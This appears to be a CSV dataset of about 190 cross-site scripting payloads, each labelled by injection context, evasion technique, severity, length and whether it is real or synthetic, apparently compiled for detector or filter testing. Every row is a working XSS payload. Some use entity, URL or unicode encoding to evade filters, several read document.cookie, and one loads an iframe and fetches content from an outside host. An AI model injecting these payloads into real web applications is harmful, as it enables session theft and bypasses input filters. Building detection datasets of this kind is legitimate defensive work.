payload,context,technique,severity,length,source
<img onlo&#97;d=&#97;l&#101;rt('XSS')>,tag_injection,synthetic,medium,38,synthetic
<svg ontoggle=\u0061lert(location.hash)/>,tag_injection,synthetic,medium,41,synthetic
JavAscRipT:pRomPt(1),js_uri,synthetic,medium,20,synthetic
"document.write(""<img src=x onerror=alert(location.hash)>"")",dom_sink,synthetic,medium,58,synthetic
"""}]}';</script><script>alert('You got AnonKryptiQuzed')</script>",script_injection,none,medium,64,real
"<legend draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</legend>",event_handler,none,medium,68,real
<b onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,52,real
<IMG SRC=javascript:alert(&quot;AnonKryptiQuz&quot;)>,js_uri,case_variation,medium,53,real
<script>alert(1234)</script>,script_injection,none,medium,28,real
"<SCRIPT>document.write(""XSS"");</SCRIPT>",script_injection,case_variation,low,39,real
<menu onblur=alert(1) tabindex=1 id=x></menu><input autofocus>,event_handler,none,medium,62,real
"<em onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</em>",event_handler,none,medium,64,real
""" onmouseover=console.log(location.hash) """,attribute_escape,synthetic,medium,42,synthetic
"<animatetransform ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</animatetransform>",event_handler,none,medium,113,real
<style onfocusout=alert(1) tabindex=1 id=x></style><input autofocus>,event_handler,none,medium,68,real
"<time onclick=""alert(1)"" style=display:block>AnonKryptiQuz</time>",event_handler,none,medium,65,real
"<option onmousemove=""alert(1)"">AnonKryptiQuz</option>",event_handler,none,medium,53,real
<input2 onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
<img/src/onerror=onpageshow=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\x281\x29'>,event_handler,restricted_chars,high,139,real
"<sub draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</sub>",event_handler,none,medium,62,real
"<div style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(9046)"" onclick=""alert(9046)"">x</button>",event_handler,none,medium,126,real
"ABC<div style=""x:\x0Aexpression(javascript:alert(5306)"">DEF",js_uri,none,medium,59,real
<script x>,script_injection,none,low,10,real
<;/script>;<;script>;alert(1)<;/script>;,generic,none,medium,40,real
"<style>@keyframes slidein {}</style><bgsound style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></bgsound>",event_handler,none,medium,168,real
"prototype.join=function(){confirm(""PWND:""+document.body.innerHTML)}')();",dom_sink,none,medium,72,real
"<fieldset draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</fieldset>",event_handler,none,medium,74,real
"""|prompt(9)|""",generic,none,medium,13,real
"<meta onbeforecut=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</meta>",event_handler,none,medium,85,real
<select onchange=alert(1)><option>1<option>2,event_handler,none,medium,44,real
<input onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</input>,event_handler,none,medium,76,real
<svg onload=\u0061lert(document.cookie)/>,tag_injection,synthetic,medium,41,synthetic
"<style>@keyframes slidein {}</style><small style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></small>",event_handler,none,medium,170,real
"<strike onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</strike>",event_handler,none,medium,73,real
%E5%98%8D%E5%98%8A%20<img/src/onerror=alert(AnonKryptiQuz`)>,event_handler,url_encoding,medium,60,real
<aside onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</aside>,event_handler,none,medium,76,real
"<IMG """"""><SCRIPT>alert(1)</SCRIPT>"">",script_injection,case_variation,medium,36,real
"<IMG SRC=\""jav&#x09;ascript:alert('XSS');\"">",tag_injection,html_entity|whitespace_obfuscation|case_variation,medium,44,real
<samp id=x tabindex=1 onfocus=alert(1)></samp>,event_handler,none,medium,46,real
"<progress onclick=""alert(1)"" style=display:block>AnonKryptiQuz</progress>",event_handler,none,medium,73,real
"<param onclick=""alert(1)"" style=display:block>AnonKryptiQuz</param>",event_handler,none,medium,67,real
"<applet id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></applet>",event_handler,none,medium,88,real
"<noframes draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</noframes>",event_handler,none,medium,72,real
<svg onmouseover=\u0061lert(location.hash)/>,tag_injection,synthetic,medium,44,synthetic
<title id=x tabindex=1 ondeactivate=alert(1)></title><input id=y autofocus>,event_handler,none,medium,75,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><article id=x style=""position:absolute;"" onanimationcancel=""print()""></article>",event_handler,none,low,183,real
"<tt draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</tt>",event_handler,none,medium,82,real
"<picture oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,100,real
"<blockquote onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</blockquote>",event_handler,none,medium,81,real
"<style>@keyframes slidein {}</style><image style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></image>",event_handler,none,medium,170,real
"<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(3700)}),x</script>",script_injection,none,medium,104,real
"<rtc onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</rtc>",event_handler,none,medium,79,real
"%3Csvg onclick=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,medium,60,synthetic
"<ol onmouseup=""alert(1)"">AnonKryptiQuz</ol>",event_handler,none,medium,43,real
"<ins onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</ins>",event_handler,none,medium,59,real
"<style>@keyframes x{}</style><body style=""animation-name:x"" onanimationend=""alert(1)""></body>",event_handler,none,medium,93,real
"<style>@keyframes slidein {}</style><img style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></img>",event_handler,none,medium,160,real
<svg ontoggle=console.log(document.cookie)>,tag_injection,synthetic,medium,43,synthetic
"<a href=""javas\x06cript:javascript:alert(5943)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
""" oNmoUseOveR=pRomPt(StrIng.frOmCHarCodE(88,83,83)) """,attribute_escape,synthetic,medium,53,synthetic
<svg onfocus=confirm(%27XSS%27)/>,tag_injection,synthetic,medium,33,synthetic
%22%3C!--%3E%3CSvg%20OnLoad=confirm?.(/d3rk%F0%9F%98%88/)%3C!--1%22%29%22%3C%21--%3E%3CSvg+OnLoad%3Dconfirm%3f%2e%28%2fd3rk%F0%9F%98%88%2f%29%3C%21--,event_handler,url_encoding,low,149,real
"<a href=""%0aalert(1)"" onclick=""protocol='javascript'"">test</a>",attribute,event_handler,medium,62,real
"<tbody onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</tbody>",event_handler,none,medium,70,real
"setTimeout(""prompt(document.cookie)"",0)",dom_sink,synthetic,medium,39,synthetic
"""%3E%3Csvg onbegin=console.log(document.domain)%3E",tag_injection,synthetic,medium,50,synthetic
<ins onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53,real
"""%3E%3Csvg onerror=console.log(1)%3E",tag_injection,synthetic,medium,36,synthetic
"<head draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</head>",event_handler,none,medium,66,real
%3Csvg ontoggle=confirm(document.cookie)/%3E,tag_injection,synthetic,medium,44,synthetic
<body onpointermove=alert(1) style=display:block>AnonKryptiQuz</body>,event_handler,none,medium,69,real
<scRipT>/*/cOnfIrm(doCumEnt.doMaiN)</scRipT>,script_injection,synthetic,medium,44,synthetic
"<param onmouseup=""alert(1)"">AnonKryptiQuz</param>",event_handler,none,medium,49,real
"<style>@keyframes slidein {}</style><figcaption style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></figcaption>",event_handler,none,medium,180,real
"""%3E%3Csvg onmouseenter=console.log(document.cookie)%3E",tag_injection,synthetic,medium,55,synthetic
<plaintext onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</plaintext><input value=clickme>,event_handler,none,medium,109,real
<noframes onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</noframes>,event_handler,none,medium,82,real
"<img src=x onerror=\x11""javascript:alert(1156)"">",event_handler,none,medium,48,real
"<time onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></time>",event_handler,none,medium,281,real
"<tfoot onmouseup=""alert(1)"">AnonKryptiQuz</tfoot>",event_handler,none,medium,49,real
"<map onmousedown=""alert(1)"">AnonKryptiQuz</map>",event_handler,none,medium,47,real
%3Csvg onmouseover=confirm(location.hash)/%3E,tag_injection,synthetic,medium,45,synthetic
<figure onpointermove=alert(1) style=display:block>AnonKryptiQuz</figure>,event_handler,none,medium,73,real
"%22><svg onbegin=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,60,synthetic
<scr	ipt>/*/alert('XSS')</scr	ipt>,script_injection,synthetic,medium,34,synthetic
"<div draggable=""true"" contenteditable>drag me</div><frameset ondragover=alert(1) contenteditable>drop here</frameset>",event_handler,none,medium,117,real
<svg ontoggl&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,62,synthetic
"<style>@keyframes x{}</style><samp style=""animation-name:x"" onwebkitanimationend=""alert(1)""></samp>",event_handler,none,medium,99,real
<code id=x tabindex=1 onbeforeactivate=alert(1)></code>,event_handler,none,medium,55,real
javascript://%250Aalert(1),js_uri,url_encoding,medium,26,real
"<img src=x onerror=\x00""javascript:alert(0680)"">",event_handler,none,medium,48,real
' oNfoCus=alErt(1) ',attribute_escape,synthetic,medium,20,synthetic
<form onreset=alert(1)><input type=reset>,event_handler,none,medium,41,real
"<iframe onmouseup=""alert(1)"">AnonKryptiQuz</iframe>",event_handler,none,medium,51,real
<cite onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</cite><input value=clickme>,event_handler,none,medium,99,real
' ontoggle=alert(document.cookie) ',attribute_escape,synthetic,medium,35,synthetic
"<style>:target {color:red;}</style><summary id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></summary>",event_handler,none,medium,118,real
"<style>:target {color: red;}</style><noscript id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noscript>",event_handler,none,medium,119,real
"<div draggable=""true"" contenteditable>drag me</div><strong ondragover=alert(1) contenteditable>drop here</strong>",event_handler,none,medium,113,real
<input4 onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,68,real
<xmp id=x tabindex=1 onbeforedeactivate=alert(1)></xmp><input autofocus>,event_handler,none,medium,72,real
"<bdo onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</bdo>",event_handler,none,medium,68,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><area id=x style=""position:absolute;"" onanimationcancel=""print()""></area>",event_handler,none,low,177,real
"<a href=""javas\x01cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
"<a href=""jav&#97ascript:javascript:alert(2440)"">test1</a>",js_uri,html_entity,medium,57,real
"<dir onmouseout=""alert(1)"">AnonKryptiQuz</dir>",event_handler,none,medium,46,real
"&#101;v&#97;l(""confirm(String.fromCh&#97;rCod&#101;(88,83,83))"")",dom_sink,synthetic,medium,64,synthetic
"""%3E%3Csvg onerror=prompt(document.domain)%3E",tag_injection,synthetic,medium,45,synthetic
"<tbody ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</tbody>",event_handler,none,medium,91,real
"<details oncut=""alert(1)"" contenteditable>AnonKryptiQuz</details>",event_handler,none,medium,65,real
%3Cscript%3E/*/confirm(1)%3C/script%3E,script_injection,synthetic,medium,38,synthetic
""" onload=prompt(location.hash) """,attribute_escape,synthetic,medium,32,synthetic
' onfocus=prompt(1) ',attribute_escape,synthetic,medium,21,synthetic
"<img src=x onerror=\x10""javascript:alert(4195)"">",event_handler,none,medium,48,real
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert(7710);"">",event_handler,case_variation,medium,80,real
<button popovertarget=x>Click me</button><ins onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</ins>,event_handler,none,medium,102,real
"""><Svg onErrOr=ConFirM(dOcuMenT.dOmaIn)>",tag_injection,synthetic,medium,40,synthetic
<iframe onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</iframe>,event_handler,none,medium,78,real
<button popovertarget=x>Click me</button><strike onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</strike>,event_handler,none,medium,108,real
"<script charset=""\x22>javascript:alert(0624)</script>",script_injection,none,medium,53,real
"<select onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</select>",event_handler,none,medium,65,real
<pre onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</pre>,event_handler,none,medium,72,real
"<th draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</th>",event_handler,none,medium,57,real
<caption onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
'>'+'><script>alert(2);</script>,script_injection,none,medium,32,real
"<div draggable=""true"" contenteditable>drag me</div><track ondrop=alert(1) contenteditable style=display:block>drop here</track>",event_handler,none,medium,127,real
"<td onmousemove=""alert(1)"">AnonKryptiQuz</td>",event_handler,none,medium,45,real
<svg onmous&#101;ov&#101;r=confirm('XSS')>,tag_injection,synthetic,medium,42,synthetic
"&lt;STYLE&gt;li {list-style-image&#58; url(\""javascript&#058;alert('XSS')\"");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS",generic,html_entity,medium,115,real
<x oncut=alert(1)>copy this!,event_handler,none,medium,28,real
"&#00;</form><input type&#61;""date"" onfocus=""alert(6317)"">",event_handler,html_entity,medium,57,real
<section onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</section><input value=clickme>,event_handler,none,medium,105,real
%3Cimg src='null' onerror=alert('spyerror')%3E,event_handler,url_encoding,medium,46,real
"%27 ontoggle=alert(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,medium,53,synthetic
"<mark onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</mark>",event_handler,none,medium,61,real
"<optgroup onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</optgroup>",event_handler,none,medium,75,real
"<style>@keyframes slidein {}</style><embed style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></embed>",event_handler,none,medium,164,real
<progress id=x tabindex=1 ondeactivate=alert(1)></progress><input id=y autofocus>,event_handler,none,medium,81,real
<code onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</code><input value=clickme>,event_handler,none,medium,108,real
"""><Svg onMouSeeNteR=aLerT('XSS')>",tag_injection,synthetic,medium,33,synthetic
<script>alert(document.domain)</script>,script_injection,none,medium,39,real
%22><svg onfocus=prompt(1)>,tag_injection,synthetic,medium,27,synthetic
"<style>:target {color:red;}</style><rt id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></rt>",event_handler,none,medium,108,real
"<menu onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</menu>",event_handler,none,medium,67,real
"<code onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</code>",event_handler,none,medium,81,real
%27 onclick=console.log(1) %27,attribute_escape,synthetic,medium,30,synthetic
"<video onerror=""javascript:alert(1)""><source>//INJECTX",event_handler,none,medium,54,real
<label onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
"""><svg on&#101;rror=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,medium,63,synthetic
"<script>onerror=eval,new name</script>",script_injection,restricted_chars,high,38,real
"<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>",script_injection,url_encoding,high,353,real
"<;BODY BACKGROUND="";javascript:alert(';XSS';);"";>;",js_uri,none,medium,50,real
"<style>@keyframes x{}</style><source style=""animation-name:x"" onanimationstart=""alert(1)""></source>",event_handler,none,medium,99,real
"""><svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,75,synthetic
"<input3 onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</input3>",event_handler,none,medium,71,real
"<template oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,101,real
"<span oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</span>",event_handler,none,medium,60,real
"<samp onmouseover=""alert(1)"">AnonKryptiQuz</samp>",event_handler,none,medium,49,real
AnonKryptiQuz@example(<script>alert(0)</script>).com,script_injection,none,medium,52,real
"""><Svg onTogGle=coNfiRm(1)>",tag_injection,synthetic,medium,27,synthetic
<svG oNfoCus=alErt('XSS')>,tag_injection,synthetic,medium,26,synthetic
%3Ciframe%20srcdoc%3D%60%3Cscript%3Ealert%28%60AnonKryptiQuz%60%29%3C%2Fscript%3E%60%3E%3C%2Fiframe%3E,generic,url_encoding,low,102,real
<button popovertarget=x>Click me</button><audio2 onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</audio2>,event_handler,none,medium,108,real
<option onpointerover=alert(1) style=display:block>AnonKryptiQuz</option>,event_handler,none,medium,73,real
<script>confirm`document.cookie`</script>,script_injection,synthetic,medium,41,synthetic
"<center onclick=""alert(1)"" style=display:block>AnonKryptiQuz</center>",event_handler,none,medium,69,real
<svg ontoggle=console.log(location.hash)/>,tag_injection,synthetic,medium,42,synthetic
"<area onmouseup=""alert(1)"">AnonKryptiQuz</area>",event_handler,none,medium,47,real
<multicol onpointerdown=alert(1) style=display:block>AnonKryptiQuz</multicol>,event_handler,none,medium,77,real
<svg onbegin=alert(%27XSS%27)>,tag_injection,synthetic,medium,30,synthetic
&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,js_uri,none,medium,62,real
"<source onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</source>",event_handler,none,medium,73,real
"<source oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,100,real
<script id=x tabindex=1 onbeforedeactivate=alert(1)></script><input autofocus>,script_injection,none,medium,78,real
<figcaption id=x tabindex=1 ondeactivate=alert(1)></figcaption><input id=y autofocus>,event_handler,none,medium,85,real
"<div draggable=""true"" contenteditable>drag me</div><image3 ondrop=alert(1) contenteditable style=display:block>drop here</image3>",event_handler,none,medium,129,real
""" onmous&#101;ov&#101;r=consol&#101;.log(1) """,attribute_escape,synthetic,medium,45,synthetic
<button onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</button><input value=clickme>,event_handler,none,medium,112,real
"<style>@keyframes x{}</style><marquee style=""animation-name:x"" onanimationstart=""alert(1)""></marquee>",event_handler,none,medium,101,real
"<style>@keyframes x{}</style><strong style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></strong>",event_handler,none,medium,105,real
"' onclick=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,medium,58,synthetic
<frame onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
"<dt onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</dt>",event_handler,none,medium,80,real
"<del onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</del>",event_handler,none,medium,62,real
"><img/onerror=""javascript:alert(1%26%23x000000029;"" src=x>",event_handler,url_encoding,medium,58,real
"<svG/x="">""/oNloaD=confirm()//",event_handler,case_variation,medium,29,real
"<command onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</command>",event_handler,none,medium,71,real
"<style>@keyframes x{}</style><command style=""animation-name:x"" onanimationstart=""alert(1)""></command>",event_handler,none,medium,101,real
"<set onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</set>",event_handler,none,medium,65,real
